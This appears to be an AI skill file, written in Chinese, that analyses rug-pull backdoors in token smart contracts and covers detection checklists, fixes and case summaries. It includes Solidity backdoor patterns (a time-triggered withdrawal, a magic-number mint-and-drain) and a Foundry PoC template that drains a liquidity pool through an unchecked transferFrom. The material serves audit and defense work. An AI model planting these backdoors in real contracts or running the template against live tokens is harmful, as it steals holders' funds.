---
name: rug-pull-vulnerability
description: Rug pull vulnerability analysis covering 5 real cases with $1.2M total loss. Use when analyzing hidden backdoor functions, time-based triggers, magic number conditions, or unaudited contracts. Includes detection methods, liquidity lock verification, and defense strategies against exit scams.
---

# Rug Pull 漏洞分析

## 快速识别

### 核心特征
- ✓ 隐藏的后门函数（税收钱包、紧急提款）
- ✓ 魔法数字或复杂时间条件
- ✓ `transferFrom` 缺少 allowance 检查
- ✓ 未锁定的流动性池
- ✓ 匿名团队 + 未审计合约

### 快速检查清单 (5 分钟)
- [ ] 搜索 `onlyOwner` 修饰的敏感函数
- [ ] 检查 `transferFrom` 是否验证 allowance
- [ ] 搜索魔法数字或特殊条件判断
- [ ] 检查是否有时间相关的后门逻辑
- [ ] 验证流动性是否锁定
- [ ] 确认合约是否经过审计

### 本质公式
```
Rug Pull = 预植入后门 × 隐蔽触发条件 × 未审计合约
```

## 漏洞分类

### 主要类型

**A. Backdoor Function (后门函数)** - 60%
- 税收钱包操纵、时间触发器、魔法数字
- 典型案例: Roar ($777K), YziAI ($239K), IRYSAI ($70K)

**B. Liquidity Removal (流动性移除)** - 40%
- 未授权的 transferFrom、直接池操纵
- 典型案例: BUBAI ($131K), VRug ($8.4K)

📖 **详细分类**: [Rug Pull 详细分析](../references/vulnerabilities/rug-pull-detailed-analysis.md)

## 核心攻击模式

### 模式 1: 时间触发后门

```solidity
// ❌ 漏洞代码
function EmergencyWithdraw() public {
    uint256 T0 = 0x67ff15af; // 隐藏的时间戳
    uint256 rate = BIGC / DEN;
    
    if (block.timestamp >= T0) {
        if ((((block.timestamp * rate * K) - (OFF * rate)) / (rate * K)) 
            == (block.timestamp - T0)) {
            // 复杂的时间条件，难以被发现
            token.transfer(msg.sender, balance);
        }
    }
}

// 攻击: 在特定时间窗口调用
EmergencyWithdraw();
```

### 模式 2: 魔法数字后门

```solidity
// ❌ 漏洞代码
function transferFrom(address from, address to, uint256 amount) 
    public override returns (bool) {
    if(msg.sender == manager && amount == 1199002345) { // 魔法数字
        _mint(address(this), supply * 10000); // 大量铸币
        _approve(address(this), router, supply * 100000);
        
        // 抽取流动性
        IUniswapV2Router02(router).swapExactTokensForETH(
            balanceOf(to) * 1000,
            1,
            path,
            manager,
            block.timestamp + 1e10
        );
        return true;
    }
    // 正常逻辑
}

// 攻击: 使用魔法数字触发
transferFrom(pool, attacker, 1199002345);
```

### 模式 3: 未授权的 TransferFrom

```solidity
// ❌ 漏洞代码
function transferFrom(address from, address to, uint256 amount) 
    public returns (bool) {
    // 缺少 allowance 检查！
    _balances[from] -= amount;
    _balances[to] += amount;
    return true;
}

// 攻击: 直接从流动性池转移代币
uint256 pairBalance = token.balanceOf(uniswapPair);
token.transferFrom(uniswapPair, attacker, pairBalance - 100);
IUniswapV2Pair(uniswapPair).sync();
```

🔗 **更多模式**: [完整攻击路径](../references/vulnerabilities/rug-pull-detailed-analysis.md#attack-patterns)

## 关键防御

### 必须实施 (P0)

```solidity
// ✅ 正确的 transferFrom 实现
function transferFrom(address from, address to, uint256 amount) 
    public returns (bool) {
    require(_allowances[from][msg.sender] >= amount, "Insufficient allowance");
    _allowances[from][msg.sender] -= amount;
    _transfer(from, to, amount);
    return true;
}

// ✅ 锁定流动性
function lockLiquidity(uint256 duration) external onlyOwner {
    require(!liquidityLocked, "Already locked");
    liquidityUnlockTime = block.timestamp + duration;
    liquidityLocked = true;
}

// ✅ 移除危险的后门函数
// 不要添加 EmergencyWithdraw、setTaxWallet 等可疑函数
```

### 推荐实施 (P1)

```solidity
// ✅ 使用时间锁保护敏感操作
import "@openzeppelin/contracts/governance/TimelockController.sol";

// ✅ 多签钱包管理
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

// ✅ 限制铸币功能
uint256 public constant MAX_SUPPLY = 1000000 ether;

function mint(address to, uint256 amount) external onlyOwner {
    require(totalSupply() + amount <= MAX_SUPPLY, "Exceeds max supply");
    _mint(to, amount);
}
```

### 用户防护措施

- 🔍 使用 Token Sniffer、RugDoc 等工具检测
- 🔒 确认流动性已锁定（Unicrypt、Team Finance）
- 📊 检查代币持有分布（避免高度集中）
- 👥 验证团队身份和审计报告
- ⏰ 避免投资新上线且未审计的项目

📖 **完整防御方案**: [详细防御策略](../references/vulnerabilities/rug-pull-detailed-analysis.md#defense)

## 典型案例

### 案例 1: Roar (2024-11-08)
- **损失**: $777,000
- **类型**: Time-based Backdoor
- **根因**: 复杂时间计算隐藏的 EmergencyWithdraw 函数
- **PoC**: `src/test/2024-11/Roar_exp.sol`

### 案例 2: YziAI (2024-11-08)
- **损失**: $239,400
- **类型**: TransferFrom Backdoor with Magic Number
- **根因**: transferFrom 中的魔法数字触发铸币和流动性抽取

### 案例 3: BUBAI (2024-11-08)
- **损失**: $131,000
- **类型**: Unauthorized TransferFrom
- **根因**: transferFrom 缺少 allowance 检查

📖 **完整案例库**: [所有 5 个案例](../references/vulnerabilities/rug-pull-detailed-analysis.md#cases)

## PoC 快速模板

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract RugPullExploitTest is Test {
    address constant VICTIM_TOKEN = 0x...;
    address constant UNISWAP_PAIR = 0x...;
    
    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK_NUMBER - 1);
    }
    
    function testUnauthorizedTransferFrom() public {
        // 从流动性池转移代币（无需授权）
        uint256 pairBalance = IERC20(VICTIM_TOKEN).balanceOf(UNISWAP_PAIR);
        
        IERC20(VICTIM_TOKEN).transferFrom(
            UNISWAP_PAIR, 
            address(this), 
            pairBalance - 100
        );
        
        // 更新储备
        IUniswapV2Pair(UNISWAP_PAIR).sync();
        
        // 验证攻击成功
        assertGt(IERC20(VICTIM_TOKEN).balanceOf(address(this)), 0);
    }
}
```


## 统计数据

| 指标 | 数值 |
|------|------|
| 案例数 | 5 |
| 总损失 | $1.2M |
| 平均损失 | $245K |
| 最大损失 | $777K (Roar) |
| 高发年份 | 2024 (5 cases) |
| 主要链 | Ethereum (60%), BSC (40%) |

## 检测工具

### 自动化工具
- 🔍 [Token Sniffer](https://tokensniffer.com/) - 代币安全检测
- 🔍 [RugDoc](https://rugdoc.io/) - 项目风险评估
- 🔍 [GoPlus Security](https://gopluslabs.io/) - 合约安全扫描
- 🔍 [Honeypot.is](https://honeypot.is/) - 蜜罐检测

### 手动检查
- 📖 [Rug Pull 检测清单](../references/vulnerabilities/rug-pull-detailed-analysis.md#detection)
- 🔧 [代码审计指南](../references/vulnerabilities/rug-pull-detailed-analysis.md#audit-guide)

## 相关资源

- 📖 [详细分析](../references/vulnerabilities/rug-pull-detailed-analysis.md)
- 📊 [案例索引](../references/case-index.md#rug-pull)
- 🎯 [VCAT 分类框架](../references/vcat-framework.md)
- 🔍 [IPDOR 分析框架](../references/ipdor-framework.md)
- 🛠️ [工具和资源](../references/tools-and-resources.md)

---

**版本**: v2.0 (优化版)  
**案例数**: 5  
**最后更新**: 2026-01-29  
**行数**: ~250 (优化前: 2534)
